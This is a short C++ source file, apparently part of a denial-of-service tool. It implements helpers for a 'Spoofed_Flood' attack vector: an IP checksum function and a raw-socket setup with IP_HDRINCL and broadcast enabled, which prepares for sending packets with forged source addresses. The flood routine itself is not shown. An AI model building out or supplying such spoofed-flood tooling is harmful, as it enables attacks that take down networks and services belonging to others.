#include <netinet/in.h>

#include "../Headers/Spoofed_Flood.hpp"
#include "../Headers/Logging.hpp"

Spoofed_Flood::Spoofed_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){

}

unsigned short Spoofed_Flood::csum(unsigned short *buf, int len) {
    unsigned long sum;
    for(sum=0; len>0; len--){
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int Spoofed_Flood::make_socket(int protocol) {
    int sock, on = 1;
    if((sock = socket(AF_INET, SOCK_RAW, protocol)) == -1){
        print_error("socket() error");
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
        print_error("setsockopt() error");
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1){
        print_error("setsockopt() error");
        exit(EXIT_FAILURE);
    }

    return sock;
}
